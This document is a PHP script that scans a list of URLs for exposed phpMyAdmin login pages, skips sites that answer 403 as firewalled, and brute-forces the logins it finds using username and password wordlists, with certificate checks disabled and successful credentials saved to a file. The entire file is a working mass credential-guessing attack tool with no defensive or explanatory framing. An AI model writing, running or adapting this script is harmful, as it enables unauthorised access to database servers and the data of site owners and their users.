<?php

// File settings
$userDic = 'user.txt';
$passDic = 'password.txt';
$urlDic = 'urls.txt';
$successLog = 'recheck.txt';
$failLog = 'fail.txt';
$wafLog = 'waf.txt';

function testUrl($url) {
    echo "Trying to connect to $url\n";
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $response = curl_exec($ch);
        $header = curl_getinfo($ch);
        curl_close($ch);

        if (strpos($response, 'phpMyAdmin') !== false) {
            echo "Success\n";
            return "Success";
        }
        if (isset($header['http_code']) && $header['http_code'] == 403) {
            echo "WAF detected\n";
            return "WAF";
        }
    } catch (Exception $e) {
        echo "Failed: " . $e->getMessage() . "\n";
        return "Fail";
    }
    return "Fail";
}

function getToken($html) {
    preg_match('/name="token" value="(.*?)"/i', $html, $matches);
    return $matches[1] ? $matches[1] :'';
}

function tryLogin($url, $user, $pwd, $token) {
    $data = [
        'pma_username' => $user,
        'pma_password' => $pwd,
        'server' => 1,
        'token' => $token,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function bruteForce($url, $userDic, $passDic) {
    echo "Starting brute force on $url\n";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $html = curl_exec($ch);
    curl_close($ch);

    $token = getToken($html);
    if (!$token) {
        echo "Token not found\n";
        return;
    }

    $users = file($userDic, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $passwords = file($passDic, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    foreach ($users as $user) {
        foreach ($passwords as $pwd) {
            echo "Trying $user:$pwd\n";
            $response = tryLogin($url, $user, $pwd, $token);
            if (strpos($response, 'login') === false) {
                echo "Login successful: $user:$pwd\n";
                file_put_contents($GLOBALS['successLog'], "$url | $user | $pwd\n", FILE_APPEND);
                return;
            }
        }
    }
    echo "Brute force failed for $url\n";
}

// Reading from files
$urls = file($urlDic, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$urlsSuccess = [];
$urlsFail = [];
$urlsWaf = [];

// Site Testing
foreach ($urls as $url) {
    $result = testUrl($url);
    if ($result === "Success") {
        $urlsSuccess[] = $url;
    } elseif ($result === "WAF") {
        $urlsWaf[] = $url;
    } else {
        $urlsFail[] = $url;
    }
}

// Save results
file_put_contents($failLog, implode("\n", $urlsFail) . "\n");
file_put_contents($wafLog, implode("\n", $urlsWaf) . "\n");

// Login Experience
foreach ($urlsSuccess as $url) {
    bruteForce($url, $userDic, $passDic);
}

echo "Finished\n";
?>
